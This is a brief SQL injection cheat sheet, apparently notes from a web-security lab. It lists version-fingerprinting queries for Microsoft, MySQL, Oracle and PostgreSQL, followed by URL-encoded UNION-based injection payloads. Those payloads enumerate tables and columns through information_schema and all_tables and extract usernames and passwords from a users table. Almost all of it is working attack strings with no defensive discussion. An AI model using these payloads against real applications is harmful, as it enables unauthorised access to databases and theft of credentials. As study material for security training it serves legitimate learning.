-- Querying the database type and version
SELECT @@version -- Microsoft, MySQL
SELECT * FROM v$version -- Oracle
SELECT version() -- PostgreSQL
  
SELECT * FROM information_schema.tables -- Listing tables in a database
SELECT * FROM information_schema.columns WHERE table_name = 'Users' -- Listing data from specific tables


' UNION SELECT NULL FROM DUAL--










-- Attempting to use a UNION Attack to query the DB version
'+UNION+SELECT+'abc','def'-- 
'+UNION+SELECT+'abc','def'+FROM+dual-- 
' UNION SELECT @@version-- 
'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- 
'+UNION+SELECT+@@version,+NULL#
'UNION+SELECT+table_name,NULL+FROM+information_schema.columns--
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
